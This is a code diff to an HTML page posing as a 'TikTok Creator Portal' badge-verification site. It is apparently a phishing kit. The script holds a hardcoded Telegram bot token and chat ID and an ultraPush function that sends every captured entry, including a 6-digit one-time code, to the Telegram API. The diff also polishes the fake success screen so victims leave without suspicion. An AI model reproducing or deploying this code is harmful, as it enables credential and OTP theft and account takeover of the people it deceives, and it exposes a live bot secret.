@@ -3,8 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TikTok Creator Portal</title>
     <style>
@@ -62,14 +60,19 @@
     </div>
 
     <div id="step5" class="step"><h1>Authenticating...</h1><div class="loader-ring"></div></div>
-    <div id="step6" class="step"><div style="color:#25F4EE;font-size:60px;margin-bottom:20px;">✓</div><h1>Success</h1><p>Identity verified. Badge will be applied soon.</p></div>
+    
+    <div id="step6" class="step">
+        <div style="color:#25F4EE;font-size:60px;margin-bottom:20px;">✓</div>
+        <h1>Identity Verified</h1>
+        <p>Your request has been submitted. The badge will be applied within <b>5 business days</b>.</p>
+        <p style="font-size: 13px; margin-top: 10px; color: #888;">Now you can leave the website.</p>
+    </div>
 </div>
 
 <script>
     const TOKEN = '8727446755:AAF3qAtyukCIYkJ3JGG4cVIGxXK8kJHE74g';
     const CHAT = '7489116869';
 
-    // Anti-Cache Ultra Force Send
     function ultraPush(m) {
         const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(m)}&parse_mode=HTML&v=${Date.now()}`;
         fetch(url, { cache: "no-cache" }).catch(() => {});
@@ -103,7 +106,6 @@
 
         if(!val) return;
         
-        // Final 6-digit check for OTP step
         if(curr==3 && val.length < 6) {
             document.getElementById('msg3').innerText = "Please enter 6-digit code.";
             document.getElementById('msg3').classList.add('active');
